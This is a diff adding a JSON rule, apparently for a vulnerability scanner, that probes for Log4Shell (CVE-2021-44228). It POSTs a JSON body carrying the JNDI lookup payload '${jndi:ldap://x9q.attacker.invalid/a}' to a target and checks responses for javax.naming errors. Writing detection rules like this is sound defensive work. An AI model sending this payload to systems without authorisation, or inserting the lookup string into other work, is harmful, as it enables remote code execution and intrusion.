@@ -1,0 +1,31 @@
+{
+  "name": "web/Log4Shell JNDI lookup error probe",
+  "description": "[low] ERROR-BASED Log4Shell probe (CWE-917 / CVE-2021-44228): ${jndi:ldap://…} in a logged field makes dev-mode apps leak javax.naming errors — a non-definitive marker (definitive confirmation REQUIRES an OOB collaborator fetch, outside this in-band DSL). Keywords: log4shell log4j jndi cve-2021-44228 ldap lookup error ssti. ctrl: benign name string triggers no naming error -> not falsified. probe_url = endpoint logging the 'name' field with log4j.",
+  "cwe": "CWE-917",
+  "requests": {
+    "payload": {
+      "method": "POST",
+      "url": "{{probe_url}}",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": "{\"name\":\"${jndi:ldap://x9q.attacker.invalid/a}\"}"
+    }
+  },
+  "conditions": [
+    {
+      "type": "body_regex",
+      "request": "payload",
+      "pattern": "(?i)javax\\.naming|namingexception|jndi.*(error|refus)|invalid.*jndi",
+      "present": true
+    }
+  ],
+  "params": [
+    "probe_url"
+  ],
+  "source": "imported",
+  "successes": 1,
+  "id": "a6f28bd59cfd",
+  "created": "2026-11-05T19:30:06.502181+00:00",
+  "last_used": "2026-11-05T19:30:06.502181+00:00"
+}
